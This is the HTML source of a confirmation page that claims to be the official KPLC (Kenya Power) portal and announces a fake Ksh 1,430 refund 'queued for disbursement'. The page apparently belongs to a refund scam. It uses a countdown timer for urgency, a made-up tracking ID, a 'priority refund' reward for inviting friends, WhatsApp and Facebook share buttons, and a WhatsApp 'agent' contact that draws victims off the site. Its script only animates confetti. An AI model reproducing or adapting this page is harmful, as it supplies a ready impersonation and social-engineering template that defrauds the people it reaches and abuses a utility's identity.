<!DOCTYPE html>
<html lang="en" class="h-full bg-gray-50">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>KPLC Refund — Confirmation</title>
  <link rel="stylesheet" href="/main.css">
  <link rel="icon" href="/assets/kplc-favicon.png">
</head>
<body class="h-full flex flex-col min-h-screen bg-gradient-to-b from-blue-50 to-white" data-page-script="confirmation">
  <div class="w-full max-w-md mx-auto px-4 py-8 flex flex-col gap-6">
    <div class="flex flex-col items-center gap-2">
      <img src="/assets/kplc-logo.png" alt="KPLC Logo" class="h-12">
      <span class="flex items-center gap-2 text-xs text-gray-500 mt-1">
        <img src="/assets/ssl-badge.svg" class="h-4"> <img src="/assets/kenya-flag.svg" class="h-4"> <span>Official KPLC Portal</span>
      </span>
    </div>
    <div class="bg-white rounded-xl shadow-lg px-6 py-8 flex flex-col gap-4 items-center relative animate-fade-in">
      <!-- Confetti burst -->
      <div class="absolute inset-0 pointer-events-none z-10" id="confetti"></div>
      <h1 class="text-xl font-extrabold text-green-700 flex items-center gap-2 animate-fade-in-delayed">Refund Queued for Disbursement <span class="animate-bounce">✅</span></h1>
      <span class="text-xs text-orange-600 font-semibold animate-timer-blink">Refunds processed in batches. <span x-data="countdownTimer(24)" x-text="timer"></span> left for today’s payout!</span>
      <p class="text-gray-700 text-center animate-fade-in-delayed">Your <span class="text-orange-600 font-bold">Ksh 1,430</span> refund is being processed. Disbursement within 24 hours.</p>
      <div class="bg-gray-100 rounded-lg px-4 py-2 mt-2 text-center animate-slide-in-up">
        <span class="text-xs text-gray-600">Tracking ID: <span class="font-mono font-bold animate-pulse" x-data="trackingId()" x-text="id"></span></span>
      </div>
      <button onclick="window.location.href='referral.html'" class="w-full bg-gradient-to-r from-green-500 via-green-600 to-blue-600 hover:from-green-600 hover:to-blue-700 text-white font-extrabold rounded-xl py-3 text-lg shadow-xl transition-all duration-200 mt-4 animate-bounce-cta">Invite Friends for Priority Refund</button>
      <div class="flex gap-4 mt-4 animate-fade-in-delayed">
        <a href="#" class="bg-green-500 text-white rounded-full px-4 py-2 flex items-center gap-2 text-md hover:bg-green-600 transition animate-bounce-cta"><img src="/assets/whatsapp.svg" class="h-5"> Share on WhatsApp</a>
        <a href="#" class="bg-blue-600 text-white rounded-full px-4 py-2 flex items-center gap-2 text-md hover:bg-blue-700 transition animate-bounce-cta"><img src="/assets/facebook.svg" class="h-5"> Share on Facebook</a>
      </div>
      <div class="mt-4 bg-yellow-50 rounded-lg px-3 py-2 flex items-center gap-2 animate-slide-in-up">
        <img src="/assets/whatsapp.svg" class="h-5"> <span class="text-xs text-gray-700">Need help? <a href="https://wa.me/254700000000" class="text-green-700 font-bold underline">Contact our agent</a></span>
      </div>
    </div>
    <style>
      @keyframes fade-in { from { opacity: 0; transform: translateY(32px);} to { opacity: 1; transform: none; } }
      .animate-fade-in { animation: fade-in 0.9s cubic-bezier(.4,1.3,.6,1) both; }
      .animate-fade-in-delayed { animation: fade-in 1.3s 0.3s cubic-bezier(.4,1.3,.6,1) both; }
      @keyframes bounce-cta { 0%, 100% { transform: translateY(0);} 50% { transform: translateY(-5px);} }
      .animate-bounce-cta { animation: bounce-cta 1.5s infinite; }
      @keyframes slide-in-up { from { opacity: 0; transform: translateY(48px);} to { opacity: 1; transform: none; } }
      .animate-slide-in-up { animation: slide-in-up 1.1s 0.4s cubic-bezier(.4,1.3,.6,1) both; }
      @keyframes timer-blink { 0%, 100% { opacity: 1;} 50% { opacity: 0.7; } }
      .animate-timer-blink { animation: timer-blink 1.3s infinite; }
    @keyframes confetti-fall { from { transform: translateY(0) scale(1);} to { transform: translateY(220px) scale(1.1);} }
    </style>
    <script>
      // Confetti burst on load
      window.addEventListener('DOMContentLoaded',()=>{
        const confetti = document.getElementById('confetti');
        if(confetti){
          for(let i=0;i<36;i++){
            const el=document.createElement('div');
            el.style.position='absolute';
            el.style.left=Math.random()*100+'%';
            el.style.top=Math.random()*30+10+'%';
            el.style.width='10px';el.style.height='10px';
            el.style.borderRadius='50%';
            el.style.backgroundColor=['#00b386','#003399','#ff9800','#e0f7fa','#fff'][Math.floor(Math.random()*5)];
            el.style.opacity=0.7;
            el.style.transform=`scale(${Math.random()*1.2+0.5})`;
            el.style.animation=`confetti-fall ${Math.random()*1+1.5}s cubic-bezier(.4,1.3,.6,1) ${Math.random()}s both`;
            confetti.appendChild(el);
          }
        }
      });
    </script>
  </div>
  
  <script type="module" src="/main.js"></script>
</body>
</html>
